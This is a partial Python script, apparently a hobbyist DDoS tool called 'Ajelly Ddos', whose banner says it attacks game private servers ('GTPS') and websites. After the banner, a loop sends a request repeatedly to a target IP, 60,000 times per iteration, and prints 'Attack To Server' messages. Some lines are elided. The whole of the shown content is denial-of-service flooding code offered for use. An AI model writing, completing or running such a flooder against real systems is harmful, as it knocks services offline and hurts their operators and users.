...
print("[+]Hello World wkwk")
print("[+]Created By Ajelly")
print("[+]Don`t Abuse")
print("")
print("[+]Ajelly Ddos")
print("[+]This Tools Support To Attack GTPS & Web")
print("[+]Don`t Leak")
    ...
    while True:
        try:
            ...
            for x in range(60000):
                ...
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
            print("Attack To Server " + ip)
        except :
            print(" Ddos Attack Sended to " + ip)
